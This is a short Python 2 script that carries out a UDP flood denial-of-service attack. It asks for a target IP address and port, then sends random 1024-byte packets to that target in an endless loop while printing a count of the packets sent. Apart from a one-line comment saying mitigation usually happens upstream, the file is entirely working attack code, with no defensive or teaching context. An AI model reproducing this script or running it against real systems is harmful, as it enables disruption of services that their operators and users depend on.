# mitigation for these attacks are usually upstream from your server

import socket 
import random

#Read user input
ip = raw_input('Target IP: ') # The IP address to be atacked
port = input('Port number: ') # Port we direct to attack

sent = 1
bytes = random._urandom(1024) # determine size before loop
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #Creates a socket

while True: # Infinite loop
    sock.sendto(bytes, (ip, port)) # send packet
    print "Sent %s packets to %s at port %s." % (sent, ip, port)    
    sent += 1
